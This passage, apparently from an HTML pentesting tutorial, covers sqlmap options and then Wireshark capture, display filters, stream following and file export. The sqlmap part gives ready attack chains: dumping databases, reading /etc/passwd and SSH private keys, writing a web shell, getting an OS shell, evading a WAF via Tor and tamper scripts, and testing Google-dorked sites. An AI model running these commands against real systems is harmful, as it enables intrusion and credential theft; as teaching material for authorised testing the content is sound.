            <div class="code"># === OUTPUT OPTIONS ===

# Verbose output:
sqlmap -u "http://target.com/page.php?id=1" -v 3
# -v 0  ← Minimal output
# -v 1  ← Default
# -v 2  ← Verbose
# -v 3  ← Very verbose (HTTP requests shown)
# -v 4  ← Debug HTTP requests
# -v 5  ← Debug HTTP responses
# -v 6  ← Everything (maximum debug!)

# Save output to file:
sqlmap -u "http://target.com/page.php?id=1" --output-dir="/tmp/sqlmap_output"
# --output-dir  ← Directory for output files

# === SESSION MANAGEMENT ===

# Resume previous session:
sqlmap -u "http://target.com/page.php?id=1" --resume
# --resume  ← Continue from last scan
# SQLmap automatically saves progress!

# Flush session (start fresh):
sqlmap -u "http://target.com/page.php?id=1" --flush-session
# --flush-session  ← Delete saved session data

# === AUTOMATION ===

# Batch mode (no prompts):
sqlmap -u "http://target.com/page.php?id=1" --batch
# --batch  ← Accept all default options
# Use for: Automated scanning without interaction

# Crawl website and test all forms:
sqlmap -u "http://target.com" --crawl=3
# --crawl=3  ← Crawl depth (3 levels)
# Automatically tests ALL found forms!

# Test Google search results:
sqlmap -g "inurl:php?id="
# -g  ← Google dorking
# Finds and tests vulnerable URLs from Google!</div>

            <h5>Database-Specific Options</h5>

            <div class="code"># Specify DBMS (skip detection):
sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL
# --dbms  ← Specify database type:
#   MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Access, etc.
# Faster (skips fingerprinting)!

# MySQL-specific:
sqlmap -u "http://target.com/page.php?id=1" --dbms=MySQL --dump-all --exclude-sysdbs
# --exclude-sysdbs  ← Skip system databases
# Ignores: information_schema, mysql, performance_schema

# MSSQL-specific:
sqlmap -u "http://target.com/page.php?id=1" --dbms=MSSQL --sql-query="xp_cmdshell 'whoami'"
# xp_cmdshell = MSSQL command execution!

# PostgreSQL-specific:
sqlmap -u "http://target.com/page.php?id=1" --dbms=PostgreSQL --file-read="/etc/passwd"
# PostgreSQL allows file reads with COPY!</div>

            <div class="metaphor-box">
                <h4>💡 SQLmap Complete Workflow</h4>
                <p><strong>Professional SQL injection testing process:</strong><br><br>
                <strong>1. Discovery (Find injection point):</strong><br>
                • Test single parameter: <code>sqlmap -u "http://target.com/page.php?id=1"</code><br>
                • Test POST data: <code>sqlmap -u "URL" --data="param1=value1"</code><br>
                • Test from Burp: <code>sqlmap -r request.txt</code><br><br>
                <strong>2. Enumeration (Extract database structure):</strong><br>
                • List databases: <code>--dbs</code><br>
                • List tables: <code>-D database_name --tables</code><br>
                • List columns: <code>-D db -T table --columns</code><br>
                • Dump data: <code>-D db -T users -C username,password --dump</code><br><br>
                <strong>3. Exploitation (Take over system):</strong><br>
                • Check privileges: <code>--is-dba</code><br>
                • Read files: <code>--file-read="/etc/passwd"</code><br>
                • Write web shell: <code>--file-write="shell.php" --file-dest="/var/www/html/shell.php"</code><br>
                • OS shell: <code>--os-shell</code><br><br>
                <strong>4. Evasion (Bypass WAF):</strong><br>
                • Tamper scripts: <code>--tamper=space2comment,randomcase</code><br>
                • Random User-Agent: <code>--random-agent</code><br>
                • Proxy through Burp: <code>--proxy="http://127.0.0.1:8080"</code><br>
                • Tor anonymity: <code>--tor</code><br><br>
                <strong>Common attack chains:</strong><br>
                1. <strong>Basic SQLi → Database dump:</strong> Test → --dbs → --tables → --dump<br>
                2. <strong>SQLi → Web shell:</strong> Check DBA → --file-write shell.php → Access shell<br>
                3. <strong>SQLi → SSH:</strong> --file-read /root/.ssh/id_rsa → Use key to SSH<br>
                4. <strong>SQLi → Password hashes:</strong> --dump users table → Crack with hashcat<br><br>
                <strong>Pro tips:</strong><br>
                • Always use <code>--batch</code> for automated scanning<br>
                • Use <code>--threads=10</code> for speed<br>
                • Use <code>--level=5 --risk=3</code> for maximum detection<br>
                • Save Burp requests to file for complex injections<br>
                • Check <code>/usr/share/sqlmap</code> for tamper scripts<br>
                • Output saved to: <code>~/.local/share/sqlmap/output/</code><br><br>
                SQLmap = THE automatic SQL injection tool. Master it = own ANY database! 💉🗃️</p>
            </div>

            <h4>Wireshark (THE Ultimate Packet Analysis Tool)</h4>
            
            <p><strong>What is Wireshark?</strong> Wireshark is the world's most popular <strong>network protocol analyzer</strong>. It captures network traffic in real-time and allows you to inspect every single packet at a microscopic level. Think of it as a "network microscope" - you can see EXACTLY what's happening on the wire, analyze protocols (HTTP, DNS, TCP, UDP, TLS, etc.), troubleshoot network issues, detect malicious activity, and reconstruct entire communication sessions.</p>
            <p><strong>Why Wireshark?</strong> It supports 2000+ protocols, has powerful filtering capabilities, can decrypt encrypted traffic (with keys), and provides deep inspection of every layer from Ethernet to application data. Essential for network forensics, malware analysis, pentesting, and understanding how networks work!</p>

            <h5>Installation & Interface</h5>
            <div class="code">
# Wireshark is pre-installed on Kali Linux<br>
wireshark<br><br>

# Or install on other systems:<br>
sudo apt install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
sudo yum install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RedHat/CentOS<br>
brew install wireshark&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>

# Command-line version (tshark):<br>
tshark --version</div>
            <p><strong>Beginner's Explanation:</strong></p>
            <ul>
                <li><strong>wireshark:</strong> Opens GUI interface for interactive packet capture and analysis</li>
                <li><strong>tshark:</strong> Command-line version for scripting and automation (we'll cover this later)</li>
                <li><strong>Why both?</strong> GUI for deep analysis and learning, CLI for automated processing and remote servers</li>
            </ul>

            <h5>Starting a Capture</h5>
            <div class="code">
# 1. Launch Wireshark GUI<br>
wireshark<br><br>

# 2. Select interface (eth0, wlan0, etc.)<br>
# 3. Click blue shark fin to start capture<br>
# 4. Do your network activity (browse websites, run scans, etc.)<br>
# 5. Click red square to stop capture<br>
# 6. Save capture: File → Save As → capture.pcap<br><br>

# Capture from command line (tshark):<br>
sudo tshark -i eth0 -w capture.pcap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture to file<br>
sudo tshark -i eth0 -c 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture 100 packets<br>
sudo tshark -i eth0 -a duration:60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture for 60 seconds<br>
sudo tshark -i eth0 -f "port 80"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture with filter</div>
            <p><strong>Flag Explanations:</strong></p>
            <ul>
                <li><strong>-i INTERFACE:</strong> Capture from specific network interface (eth0, wlan0, any)</li>
                <li><strong>-w FILE:</strong> Write captured packets to file (creates .pcap file)</li>
                <li><strong>-c COUNT:</strong> Stop after capturing COUNT packets</li>
                <li><strong>-a duration:N:</strong> Auto-stop after N seconds (useful for scheduled captures)</li>
                <li><strong>-f FILTER:</strong> <strong>Capture filter</strong> (BPF syntax) - filters DURING capture (reduces file size)</li>
            </ul>

            <h5>Capture Filters vs Display Filters</h5>
            <p><strong>Critical Distinction:</strong> Wireshark has TWO types of filters that work completely differently!</p>
            <div class="code">
# CAPTURE FILTERS (Applied DURING capture - uses BPF syntax):<br>
# Set before starting capture, cannot be changed during capture<br>
# Syntax: host, port, tcp, udp, src, dst, and, or, not<br><br>

host 192.168.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only traffic to/from this IP<br>
port 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only HTTP traffic<br>
tcp port 443&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only HTTPS traffic<br>
src host 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only from source IP<br>
dst port 53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only to destination port 53 (DNS)<br>
host 192.168.1.1 and port 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture HTTP traffic to/from specific IP<br>
not broadcast and not multicast&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude broadcast/multicast traffic<br>
tcp[13] & 2 != 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Capture only TCP SYN packets<br><br>

# DISPLAY FILTERS (Applied AFTER capture - uses Wireshark syntax):<br>
# Applied to already captured packets, can be changed anytime<br>
# Much more powerful and flexible than capture filters!<br><br>

ip.addr == 192.168.1.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show traffic to/from this IP<br>
tcp.port == 80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show HTTP traffic<br>
http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show only HTTP packets<br>
http.request.method == "POST"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show only HTTP POST requests<br>
tcp.flags.syn == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show TCP SYN packets<br>
dns.qry.name contains "google"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show DNS queries for google<br>
frame.len > 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show packets larger than 1000 bytes</div>
            <p><strong>When to Use Which?</strong></p>
            <ul>
                <li><strong>Capture Filters:</strong> Use when you know EXACTLY what traffic you want BEFORE starting (reduces file size)</li>
                <li><strong>Display Filters:</strong> Use AFTER capture to analyze specific traffic (doesn't affect capture file)</li>
                <li><strong>Best Practice:</strong> Capture everything (no capture filter), then use display filters for analysis</li>
            </ul>

            <h5>Essential Display Filters</h5>
            <div class="code">
# Basic Protocol Filters:<br>
http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP traffic<br>
https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTPS traffic (encrypted)<br>
dns&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS queries/responses<br>
tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP packets<br>
udp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# UDP packets<br>
icmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ICMP (ping)<br>
arp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ARP requests/responses<br>
ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# FTP traffic<br>
ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SSH traffic<br>
telnet&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Telnet (unencrypted!)<br>
smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Email (SMTP)<br><br>

# IP Address Filters:<br>
ip.addr == 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic to/from this IP<br>
ip.src == 192.168.1.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic FROM this source IP<br>
ip.dst == 8.8.8.8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Traffic TO this destination IP<br>
!(ip.addr == 192.168.1.1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude this IP<br><br>

# Port Filters:<br>
tcp.port == 445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SMB traffic<br>
udp.port == 53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS<br>
tcp.dstport == 443&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTPS (destination port)<br>
tcp.srcport == 1234&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# From source port 1234<br><br>

# HTTP-Specific Filters:<br>
http.request&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP requests only<br>
http.response&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP responses only<br>
http.request.method == "GET"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# GET requests<br>
http.request.method == "POST"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# POST requests<br>
http.request.uri contains "admin"&nbsp;&nbsp;&nbsp;# URLs containing "admin"<br>
http.host == "example.com"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Requests to specific host<br>
http.cookie contains "session"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Cookies with "session"<br>
http.response.code == 200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP 200 OK responses<br>
http.response.code == 404&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP 404 errors<br>
http.response.code >= 400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# All HTTP errors (4xx, 5xx)<br>
http.user_agent contains "curl"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specific user agent<br><br>

# DNS Filters:<br>
dns.qry.name == "example.com"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS query for domain<br>
dns.qry.type == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# A records (IPv4)<br>
dns.qry.type == 28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# AAAA records (IPv6)<br>
dns.flags.response == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DNS responses only<br><br>

# TCP Flag Filters:<br>
tcp.flags.syn == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN packets (connection start)<br>
tcp.flags.ack == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ACK packets<br>
tcp.flags.reset == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RST packets (connection reset)<br>
tcp.flags.fin == 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# FIN packets (connection close)<br>
tcp.flags == 0x002&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN flag only<br>
tcp.flags == 0x012&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SYN+ACK<br>
tcp.flags == 0x018&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PSH+ACK (data transmission)<br><br>

# Advanced Filters:<br>
frame.len > 1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Large packets (> 1000 bytes)<br>
tcp.analysis.retransmission&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# TCP retransmissions (network issues)<br>
tcp.analysis.duplicate_ack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Duplicate ACKs (packet loss)<br>
tcp.stream eq 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# First TCP conversation<br>
tcp.stream eq 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Second TCP conversation<br>
frame.time_delta > 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packets with > 5 sec gap (delays)<br><br>

# String Matching:<br>
tcp contains "password"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Packets containing "password"<br>
http contains "Authorization"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP auth headers<br>
frame contains "admin"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Any packet with "admin"<br>
data contains 50:41:53:53&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Hex search (PASS in ASCII)<br><br>

# Combining Filters:<br>
http and ip.addr == 10.10.10.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# HTTP from specific IP<br>
tcp.port == 445 and ip.src == 192.168.1.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SMB from source IP<br>
(http.request.method == "POST") and (http contains "password")&nbsp;&nbsp;# POST with password<br>
dns or http or https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Multiple protocols<br>
!(arp or icmp)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Exclude ARP and ICMP</div>
            <p><strong>Filter Syntax Tips:</strong></p>
            <ul>
                <li><strong>Comparison:</strong> == (equals), != (not equals), > (greater), &lt; (less), >= (greater/equal), &lt;= (less/equal)</li>
                <li><strong>Logical:</strong> and, or, not, ! (or use &&, ||, !)</li>
                <li><strong>Membership:</strong> in { value1, value2 } - e.g., tcp.port in {80 443 8080}</li>
                <li><strong>String matching:</strong> contains, matches (regex)</li>
                <li><strong>Parentheses:</strong> Group conditions for complex filters</li>
            </ul>

            <h5>Follow Streams - Reconstruct Communication</h5>
            <div class="code">
# Follow TCP Stream:<br>
# Right-click packet → Follow → TCP Stream<br>
# Shows entire conversation in ASCII/HEX<br><br>

# Follow UDP Stream:<br>
# Right-click packet → Follow → UDP Stream<br><br>

# Follow HTTP Stream:<br>
# Right-click packet → Follow → HTTP Stream<br>
# Shows full HTTP request + response<br><br>

# Command-line (tshark):<br>
tshark -r capture.pcap -z follow,tcp,ascii,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow TCP stream 0<br>
tshark -r capture.pcap -z follow,tcp,hex,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow stream 1 in hex<br>
tshark -r capture.pcap -z follow,udp,ascii,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Follow UDP stream</div>
            <p><strong>Why Follow Streams?</strong> Packets are fragmented - one HTTP request might span 10 packets. "Follow Stream" reassembles the entire conversation so you can read it like a chat transcript. Perfect for reading HTTP requests, FTP credentials, extracted files, etc.</p>

            <h5>Export Objects - Extract Files from Traffic</h5>
            <div class="code">
# GUI: File → Export Objects → HTTP/SMB/TFTP/etc.<br>
# Extracts files transferred over these protocols<br><br>

# Export HTTP objects (images, downloads, etc.):<br>
File → Export Objects → HTTP → Save All<br><br>

# Export SMB objects (files shared via SMB):<br>
File → Export Objects → SMB<br><br>

# Command-line (tshark):<br>
tshark -r capture.pcap --export-objects http,./exported_files/<br>
tshark -r capture.pcap --export-objects smb,./smb_files/</div>
            <p><strong>Real-World Use:</strong> Capture malware downloads, extract images from web browsing, recover files from SMB shares, analyze transferred documents!</p>

            <h5>Statistics & Analysis Tools</h5>
            <div class="code">
# Protocol Hierarchy (Statistics → Protocol Hierarchy):<br>
# Shows breakdown of all protocols in capture<br>
# Example: HTTP: 45%, DNS: 10%, TLS: 30%, etc.<br><br>

# Conversations (Statistics → Conversations):<br>
# Shows all communication pairs (who talked to who)<br>
# Tabs: Ethernet, IPv4, IPv6, TCP, UDP<br><br>

# Endpoints (Statistics → Endpoints):<br>
# Lists all IPs/MACs and their traffic volume<br><br>

# IO Graphs (Statistics → I/O Graphs):<br>
# Visual timeline of traffic (packets/bytes over time)<br>
